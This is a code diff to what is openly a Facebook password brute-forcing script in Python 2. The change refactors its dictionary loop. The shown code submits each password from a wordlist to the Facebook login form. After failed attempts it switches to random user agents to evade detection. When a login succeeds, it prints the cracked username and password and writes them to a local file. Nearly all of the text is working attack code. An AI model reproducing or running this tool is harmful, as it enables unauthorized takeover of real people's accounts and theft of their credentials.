@@ -14,6 +14,7 @@ import os
 import ConfigParser
 import urllib2
 import socket
+import fileinput
 from multiprocessing import Process
 from pathlib import Path
 from bs4 import BeautifulSoup
@@ -161,68 +162,65 @@ def def_login():
 	# read in the username from the config file.
 	browser.form['email'] = configParser.get('Config', 'user')
 	
-	with open(dic_path) as fp:
-		line = fp.readline()
-	   	while line:
-			
-			if (internet_on() == True):
-					color_print("[+] Connection to server successfull", color='green')
-			else:
-					color_print("[!]  Connection to server failed", color='red')
-					break
-			# This is the current password in the dictionary 
-			# that we attempt to login with
-			#
-			password = format(line.strip())
-			browser.form['pass'] = str(password)
-
-			# Print out the tries
-	      		color_print("\n[*] Trying password {}".format(line.strip()), color='yellow')
-
-			# Submit the form.
- 			request = browser.submit()
-			
-
-			# Declare a BeautifulSoup Object.
-			soup = BeautifulSoup(request, 'html.parser')
-
-
-			# Attempt to brute force the password.
-			title = soup.title.string
-			if title != 'Facebook':
-
-				# We have the wrong? password so change the user agent
-				user_agents = ['Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7','Konqueror/3.0-rc4; (Konqueror/3.0-rc4; i686 Linux;;datecode)','Opera/9.52 (X11; Linux i686; U; en)']
-				random_user_agent = choice(user_agents)
-				color_print("[+] Using random user agent " + random_user_agent, color='blue')				
-				browser.addheaders = [('User-agent', random_user_agent)]
-
-				# PASSWORD NOT FOUND, DAMN!!
-				action = soup.find('form', id='login_form').get('action')
-				color_print(action, color='red')
-				print("[!] Wrong password")
-				browser.select_form(nr = 0)
-	       			line = fp.readline()
-
-				continue	
-			else:
-
-				# SUCCESS PASSWORD FOUND, YEY!!
-				username = configParser.get('Config', 'user')	
-
-				# Print out the credentials
-				color_print("Password Cracked - Username: " + username + " Password: " + password, color='green')
-
-				# Save the credentials to a file located in the passwords directory
-				color_print("[!] Saving credentials to passwords/" + username, color='blue')	
-				saveCreds = open('passwords/' + username + ".txt", 'w')
-				saveCreds.write(username + '\n')
-				saveCreds.write(password)
-				saveCreds.close()
+	for line in fileinput.input(dic_path):
+		if (internet_on() == True):
+				color_print("[+] Connection to server successfull", color='green')
+		else:
+				color_print("[!]  Connection to server failed", color='red')
 				break
+		# This is the current password in the dictionary 
+		# that we attempt to login with
+		#
+		password = format(line.strip())
+		browser.form['pass'] = str(password)
 
+		# Print out the tries
+	      	color_print("\n[*] Trying password {}".format(line.strip()), color='yellow')
+
+		# Submit the form.
+ 		request = browser.submit()
+			
+
+		# Declare a BeautifulSoup Object.
+		soup = BeautifulSoup(request, 'html.parser')
+
+
+		# Attempt to brute force the password.
+		title = soup.title.string
+		if title != 'Facebook':
+
+			# We have the wrong? password so change the user agent
+			user_agents = ['Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7','Konqueror/3.0-rc4; (Konqueror/3.0-rc4; i686 Linux;;datecode)','Opera/9.52 (X11; Linux i686; U; en)']
+			random_user_agent = choice(user_agents)
+			color_print("[+] Using random user agent " + random_user_agent, color='blue')				
+			browser.addheaders = [('User-agent', random_user_agent)]
+
+			# PASSWORD NOT FOUND, DAMN!!
+			action = soup.find('form', id='login_form').get('action')
+			color_print(action, color='red')
+			print("[!] Wrong password")
 			browser.select_form(nr = 0)
-	       		line = fp.readline()
+
+			continue	
+		else:
+
+			# SUCCESS PASSWORD FOUND, YEY!!
+			username = configParser.get('Config', 'user')	
+
+			# Print out the credentials
+			color_print("Password Cracked - Username: " + username + " Password: " + password, color='green')
+
+			# Save the credentials to a file located in the passwords directory
+			color_print("[!] Saving credentials to passwords/" + username, color='blue')	
+			saveCreds = open('passwords/' + username + ".txt", 'w')
+			saveCreds.write(username + '\n')
+			saveCreds.write(password)
+			saveCreds.close()
+			break
+
+		browser.select_form(nr = 0)
+			
+			
 #
 # call the methods.
 #
